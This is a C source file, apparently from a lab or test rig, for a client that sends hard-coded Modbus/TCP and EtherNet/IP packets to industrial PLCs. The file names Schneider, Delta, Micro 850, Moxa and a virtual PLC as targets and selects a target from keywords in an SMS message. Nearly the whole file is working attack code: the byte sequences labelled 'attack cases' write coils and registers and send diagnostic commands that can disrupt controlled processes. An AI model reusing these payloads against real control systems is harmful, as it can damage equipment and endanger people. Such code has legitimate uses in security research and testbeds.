/**********************************************************************************************************
 *  A. Standard Includes
*********************************************************************************************************/
#include <stdio.h> 
#include <string.h>
#include <unistd.h>
#include <sys/types.h>  
#include <sys/socket.h>  
#include <netinet/in.h>  
#include <arpa/inet.h> 
#include <stdlib.h>
#include <stdint.h>

/**********************************************************************************************************
 *  B. APP sepecific Includes
*********************************************************************************************************/
#include "invade.h.in"
#include "client.h"

/**********************************************************************************************************
 *  C. Object like Macro
*********************************************************************************************************/
#define BUFF_MAX_LEN 90
#define PORT 502
#define SCHNEIDER_PLC_IP 	"192.168.1.100"  //施耐德 
#define DELTA_PLC_IP 		"192.168.1.110"	 //台达 
#define Micro_850_PLC_IP 	"192.168.1.120"  //   
#define Moxa_PLC_IP 	    "192.168.1.130"  //
#define Virtual_PLC_IP      "192.168.1.146"

#define SEND_BUF_SIZE			(64u)

/**********************************************************************************************************
 *  D. Function like Macro
*********************************************************************************************************/


 /**********************************************************************************************************
 *  E. Type defines
**********************************************************************************************************/


/**********************************************************************************************************
 *  F. Local Function Declarations
**********************************************************************************************************/


 /**********************************************************************************************************
 *  G. Local Object/Variable
*********************************************************************************************************/
char SCHNEIDER_buff1[BUFF_MAX_LEN] = {0x5d,0x3a,0x00,0x00,0x00,0x06,0x00,0x05,0x00,0x07,0x00,0x00};
char SCHNEIDER_buff2[BUFF_MAX_LEN] = {0x18,0xa5,0x00,0x00,0x00,0x04,0x00,0x7e,0x01,0x01};
char SCHNEIDER_buff3[BUFF_MAX_LEN] = {0x04,0x8b,0x00,0x00,0x00,0x06,0xff,0x08,0x00,0x04,0x00,0x00};
char DELTA_buff1[BUFF_MAX_LEN] = {0x00,0x5c,0x00,0x00,0x00,0x08,0x00,0x0f,0x08,0x00,0x00,0x01,0x01,0x00};
char DELTA_buff2[BUFF_MAX_LEN] = {0xcc,0xaf,0x00,0x00,0x00,0x06,0x01,0x05,0x0c,0x30,0x00,0x00};
char Micro_850_buff1[BUFF_MAX_LEN] = {0x00,0x6c,0x00,0x00,0x00,0x08,0x00,0x0f,0x00,0x00,0x00,0x01,0x01,0x00};
char Micro_850_buff2[BUFF_MAX_LEN] = {0x70,0x00,0x42,0x00,0x55,0x12,0x34,0xe1,0x00,0x00,0x00,0x00,0x00,0x00,
	                                  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	                                  0x01,0x00,0x02,0x00,0xa1,0x00,0x04,0x00,0x0e,0x4e,0xf9,0xd7,0xb1,0x00,
	                                  0x2e,0x00,0x01,0x04,0x50,0x03,0x20,0x37,0x25,0x00,0x41,0x01,0x00,0x04,
	                                  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	                                  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	                                  0x01,0x00,0x00,0x01,0xfe,0xff};
char MOXA_buff1[BUFF_MAX_LEN] = {0x00,0x3f,0x00,0x00,0x00,0x08,0x00,0x0f,0x00,0x00,0x00,0x01,0x01,0x00};
char MOXA_buff2[BUFF_MAX_LEN] = {0x3d,0x47,0x00,0x00,0x00,0x09,0x01,0x10,0x10,0x9c,0x00,0x01,0x02,0x00,0x00};
char MOXA_buff3[BUFF_MAX_LEN] = {0x05,0x20,0x00,0x00,0x00,0x06,0x01,0x08,0x00,0x01,0xff,0x00};
/**********************************************************************************************************
 *  h. Exported Object/Variable
*********************************************************************************************************/

 
/**********************************************************************************************************
 *  I. Local Function Implementations
**********************************************************************************************************/


/**********************************************************************************************************
 *  J. Public Function Implementations
*********************************************************************************************************/

/*********************************************************************************************************
 * @brief   在短信内容中查询关键字，通过关键字匹配设备的id
 *
 * @param   char *Msg_buff 短信内容字符串
 * @usage
 *
 * @return 	Client_ePLC_Type_t, 设备id。
 *
 * 
********************************************************************************************************/
int client_Slect_PLC_Type(char *Msg_buff)
{
	printf("PLC type:%s\n", Msg_buff);
	Client_ePLC_Type_t ePLC_type;
	
	if( NULL != strstr( (const char *)Msg_buff, "SCHNEIDER") )
	{
		ePLC_type = eSCHNEIDER_PLC;
	}
	else if( NULL != strstr( (const char *)Msg_buff, "schneider") )
	{
		ePLC_type = eSCHNEIDER_PLC;
	}
	else if( NULL != strstr( (const char *)Msg_buff, "DELTA") )
	{
		ePLC_type = eDELTA_PLC;
	}
	else if( NULL != strstr( (const char *)Msg_buff, "delta") )
	{
		ePLC_type = eDELTA_PLC;
	}
	else if( NULL != strstr( (const char *)Msg_buff, "Micro_850") )
	{
		ePLC_type = eMicro_850_PLC;
	}
	else if( NULL != strstr( (const char *)Msg_buff, "Moxa") )
	{
		ePLC_type = eMoxa_PLC;
	}
	else if( NULL != strstr( (const char *)Msg_buff, "Virtual") )
	{
		ePLC_type = eVirtual_PLC;
	}
	else 
	{
		ePLC_type = eSCHNEIDER_PLC;
	}

	return ePLC_type;
}


/*********************************************************************************************************
 * @brief   sokete打开一个套接字
 *
 * @param   int domain 
 *          const char *cp 			目标ip
 *          uint16_t hostshort		端口号
 * @usage
 *
 * @return 	client_sockfd 套接字fd
 *
 * 
********************************************************************************************************/
int client_tcpinit(int domain,const char *cp,uint16_t hostshort)
{
	int client_sockfd = -1;
	int ret = 0;
	struct sockaddr_in remote_addr; 				 //服务器端网络地址结构体  
	memset(&remote_addr,0,sizeof(remote_addr)); 	 //数据初始化--清零  
	remote_addr.sin_family = domain;				 //
	remote_addr.sin_addr.s_addr = inet_addr(cp);  	 //服务器IP地址 
	remote_addr.sin_port = htons(hostshort);
	if(-1 == (client_sockfd = socket(PF_INET,SOCK_STREAM,0)))  
	{  
		perror("socket");  
		return -1;  
	}  
	if(-1 == (ret = connect(client_sockfd,(struct sockaddr *)&remote_addr,sizeof(struct sockaddr))))
	{
		perror("connect");
		return -1;
	}
	return client_sockfd;
}


/*********************************************************************************************************
 * @brief   发送Schneider  PLC攻击用例 
 *
 * @param   
 * @usage
 *
 * @return 	TURE  1
 *          FALSE 0
********************************************************************************************************/
bool_t client_Schneider_attack()
{
	bool_t	bRet = FALSE;
	char buf[SEND_BUF_SIZE];
	int client_sockfd;
	if(-1 == (client_sockfd = client_tcpinit(AF_INET,SCHNEIDER_PLC_IP,PORT)))
	{
		printf("can not connect PLC\n");
	}
	else
	{
		send(client_sockfd,SCHNEIDER_buff1,12,0);
		recv(client_sockfd,buf,BUFSIZ,0);
		sleep(10);
		send(client_sockfd,SCHNEIDER_buff2,10,0);
		recv(client_sockfd,buf,BUFSIZ,0);
		sleep(5);
		send(client_sockfd,SCHNEIDER_buff3,12,0);
		//recv(client_sockfd,buf,BUFSIZ,0);
		close(client_sockfd);//关闭套接字
		bRet = TRUE;
	} 
	return bRet;
}

/*********************************************************************************************************
 * @brief   发送DELTA  PLC攻击用例 
 *
 * @param   
 * @usagebn 
 *
 * @return 	TURE  1
 *          FALSE 0
********************************************************************************************************/
bool_t client_DELTA_attack()
{
	bool_t bRet= FALSE;
	char buf[ SEND_BUF_SIZE ];
	int client_sockfd;
	if(-1 == (client_sockfd = client_tcpinit(AF_INET,DELTA_PLC_IP,PORT)))
	{
		printf("can not connect PLC\n");
	}
	else
	{
		send(client_sockfd,DELTA_buff1,14,0);
		//recv(client_sockfd,buf,BUFSIZ,0);
		sleep(10);
		send(client_sockfd,DELTA_buff2,12,0);
		//recv(client_sockfd,buf,BUFSIZ,0);
		close(client_sockfd);//关闭套接字  
		bRet = TRUE;
	}
}

/*********************************************************************************************************
 * @brief   发送 Micro_850 PLC攻击用例 
 *
 * @param   
 * @usage
 *
 * @return 	TURE  1
 *          FALSE 0
 *
 * 
********************************************************************************************************/
bool_t client_Micro_850_attack()
{
	bool_t bRet = FALSE; 
	char buf[SEND_BUF_SIZE];
	int client_sockfd;
	if(-1 == (client_sockfd = client_tcpinit(AF_INET,Micro_850_PLC_IP,PORT)))
	{
		printf("can not connect PLC\n");
	}
	else
	{
		send(client_sockfd,Micro_850_buff1,14,0);
		recv(client_sockfd,buf,BUFSIZ,0);
		sleep(10);
		close(client_sockfd);//关闭套接字
		sleep(2);
		if( -1 == (client_sockfd = client_tcpinit(AF_INET,Micro_850_PLC_IP,44818)))
		{
			printf("can not connect PLC 44818\n");
		}
		else
		{
			send(client_sockfd,Micro_850_buff2,90,0);
			recv(client_sockfd,buf,BUFSIZ,0);
			close(client_sockfd);//关闭套接字
		}
		bRet = TRUE;
	}  
	

	return bRet;
}

/*********************************************************************************************************
 * @brief   发送 Moxa PLC攻击用例 
 *
 * @param   
 * @usage
 *
 * @return 	TURE  1
 *          FALSE 0
 *
 * 
********************************************************************************************************/
bool_t client_Moxa_attack()
{
	bool_t bRet = FALSE; 
	char buf[SEND_BUF_SIZE];
	int client_sockfd;
	if(-1 == (client_sockfd = client_tcpinit(AF_INET,Moxa_PLC_IP,PORT)))
	{
		printf("can not connect PLC\n");
	}
	else
	{
		send(client_sockfd,MOXA_buff1,14,0);
		recv(client_sockfd,buf,BUFSIZ,0);
		sleep(5);
		send(client_sockfd,MOXA_buff2,15,0);
		recv(client_sockfd,buf,BUFSIZ,0);
		//sleep(5);
		//send(client_sockfd,MOXA_buff3,12,0);
		//recv(client_sockfd,buf,BUFSIZ,0);
		close(client_sockfd);//关闭套接字
		//sleep(10);
		/*if(-1 == (client_sockfd = client_tcpinit(AF_INET,Moxa_PLC_IP,PORT)))
		{
			printf("can not connect PLC\n");
		}
		else
		{
			send(client_sockfd,MOXA_buff1,14,0);
			recv(client_sockfd,buf,BUFSIZ,0);
			close(client_sockfd);//关闭套接字
		}*/
		bRet = TRUE;
	}  
	

	return bRet;
}

bool_t client_Virtual_attack(uint16_t number)
{
	bool_t bRet = FALSE; 
	char buf[SEND_BUF_SIZE];
	int client_sockfd;
	if(-1 == (client_sockfd = client_tcpinit(AF_INET,Virtual_PLC_IP,PORT)))
	{
		printf("can not connect PLC\n");
	}
	else
	{	
		memset(buf, 0, sizeof(buf));
		if (number == 205)
		{
			strcpy(buf, "30");
		}
		else if (number == 206)
		{
			strcpy(buf, "31");
		}
		else if (number == 207)
		{
			strcpy(buf, "32");
		}
		else if (number == 208)
		{
			strcpy(buf, "33");
		}
		else if (number == 209)
		{
			strcpy(buf, "34");
		}
		else if (number == 210)
		{
			strcpy(buf, "35");
		}
		else if (number == 211)
		{
			strcpy(buf, "36");
		}
		else if (number == 212)
		{
			strcpy(buf, "37");
		}
		else if (number == 213)
		{
			strcpy(buf, "38");
		}
		else if (number == 214)
		{
			strcpy(buf, "39");
		}
		else if (number == 215)
		{
			strcpy(buf, "40");
		}
		else if (number == 216)
		{
			strcpy(buf, "41");
		}
		else if (number == 217)
		{
			strcpy(buf, "42");
		}
		else if (number == 218)
		{
			strcpy(buf, "43");
		}
		else if (number == 219)
		{
			strcpy(buf, "44");
		}
		else if (number == 220)
		{
			strcpy(buf, "45");
		}
		else if (number == 221)
		{
			strcpy(buf, "46");
		}
		else if (number == 222)
		{
			strcpy(buf, "47");
		}
		else if (number == 223)
		{
			strcpy(buf, "48");
		}
		else if (number == 224)
		{
			strcpy(buf, "49");
		}
		else if (number == 225)
		{
			strcpy(buf, "50");
		}
		else if (number == 226)
		{
			strcpy(buf, "51");
		}
		else if (number == 227)
		{
			strcpy(buf, "52");
		}
		else if (number == 3)
		{
			strcpy(buf, "53");
		}
		send(client_sockfd,buf,strlen(buf),0);
		close(client_sockfd);//关闭套接字
		bRet = TRUE;
	}  
	

	return bRet;
}

/*********************************************************************************************************
 * @brief   通过关键字寻找对应设备的攻击程序
 *
 * @param   uint8_t *Msg_buff 
 *     
 * @usage
 *
 * @return 	TURE  1
 *          FALSE 0
 * 
********************************************************************************************************/
bool_t client_Tcpconection(uint8_t *Msg_buff, uint16_t number)
{
	bool_t		bRet = FALSE;
	Client_ePLC_Type_t ePLC_type;
	ePLC_type = client_Slect_PLC_Type( Msg_buff );
	switch ( ePLC_type )
	{		
		case eSCHNEIDER_PLC:
		{
			bRet = client_Schneider_attack();
		}
		break;

		case eDELTA_PLC:
		{
			bRet = client_DELTA_attack();
		}
		break;

		case eMicro_850_PLC:
		{
			bRet = client_Micro_850_attack();
		}
		break;

		case eMoxa_PLC:
		{
			bRet = client_Moxa_attack();
		}
		break;

		case eVirtual_PLC:
		{
			bRet = client_Virtual_attack(number);
		}
		break;

		default:
		{
			printf("not find keywork\n");
		}
	}

	return bRet;

}
